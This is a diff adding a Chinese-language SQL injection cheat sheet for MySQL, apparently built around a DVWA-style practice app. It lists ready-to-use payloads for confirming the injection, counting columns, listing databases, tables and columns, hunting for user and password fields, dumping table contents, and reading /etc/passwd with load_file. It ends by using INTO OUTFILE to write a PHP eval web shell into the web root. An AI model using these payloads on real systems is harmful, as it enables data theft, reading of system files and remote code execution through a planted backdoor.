@@ -1,0 +1,87 @@
+mysql 获取操作系统信息
+
+1' and 1=2 union select 1,@@global.version_compile_os from mysql.user #
+
+
+
+测试数据库连接权限（是否为root）
+
+1' and ord(mid(user(),1,1))=114 -- 
+
+
+
+查询数据库
+
+1' and 1=2 union select 1,schema_name from information_schema.schemata -- 
+
+
+单引号报错，说明存在注入漏洞
+
+'
+
+
+如果没有将表内容遍历出来，说明不是数字型注入
+
+1 or 1=1 
+
+
+如果列举了所有内容，说明是字符型注入
+
+1' or '1'='1
+
+
+猜字段长度
+
+1' order by 1 -- 
+
+
+显示字段位置
+
+-1' union select 1,2 #
+
+
+显示当前用户名和数据库
+
+1' and 1=2 union select user(),database() #
+
+
+显示版本号
+
+1' and 1=2 union select version() #
+
+
+查询含所有账号和密码的表
+
+1' and 1=2 union  select 1,table_name from information_schema.TABLES where table_name like "%user%" or table_name like  "%pass%"  -- 
+
+
+
+
+查询所有表 含user和pass的字段
+
+1' and 1=2 union  select TABLE_NAME,COLUMN_NAME from  information_schema.COLUMNS where COLUMN_NAME like "%user%" or COLUMN_NAME like "%pass%" -- 
+
+
+猜表名
+
+1' and exists(select * from users) --
+
+
+猜解字段名
+
+1' and exists(select first_name from users) --
+
+
+爆出数据库中字段的内容 
+
+1' and 1=2 union select first_name,last_name from users --
+
+
+读取系统文件
+
+1' and 1=2 union select 1,load_file("/etc/passwd") -- 
+
+
+写入一句话木马
+1' and 1=2 union select 1,"\<\?php eval($_POST['x']);\?\>" into outfile "/var/www/html/target/upload/a.php";
+
